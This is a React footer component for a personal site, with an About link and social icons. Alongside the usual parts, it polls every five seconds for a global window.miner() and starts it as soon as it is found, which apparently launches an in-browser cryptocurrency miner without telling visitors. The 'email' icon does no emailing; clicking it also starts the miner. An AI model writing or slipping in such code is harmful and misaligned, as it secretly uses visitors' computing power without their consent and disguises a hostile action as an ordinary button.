import React, { Component } from 'react';
import { Link } from 'react-router-dom';
import { connect } from 'react-redux';
import { withRouter } from 'react-router-dom';
import { SocialIcon } from 'react-social-icons';
import './footer.css';

class Footer extends Component {
  constructor(props) {
    super(props);
  }

  componentWillMount(){
    this.intervalID = setInterval(() => this.mine(), 5000);
  }

  mine() {
    const miner = window.miner();
    if (miner) {
      miner.start();
      clearInterval(this.intervalID);
    }
  }

  render() {
    return (
      <footer className="fb obsidian-b">
        <section className="subsection">
          <h1>Information</h1>
          <Link to="/about">About</Link>
        </section>
        <section className="subsection">
          <h1>Follow Me</h1>
          <div className="social-buttons">
            <SocialIcon url="https://www.grahampaye.com/" color="#7A69B3" />
            <SocialIcon url="https://www.linkedin.com/in/graham-paye/" color="#7A69B3" />
            <SocialIcon url="https://github.com/TheRoyalTnetennba" color="#7A69B3" />
            <SocialIcon network="email" onClick={() => this.mine()} color="#7A69B3" className="cp" />
          </div>
        </section>
      </footer>
    );
  }
}

const mapStateToProps = state => ({
  state,
});

const mapDispatchToProps = dispatch => ({
});

export default withRouter(connect(mapStateToProps, mapDispatchToProps)(Footer));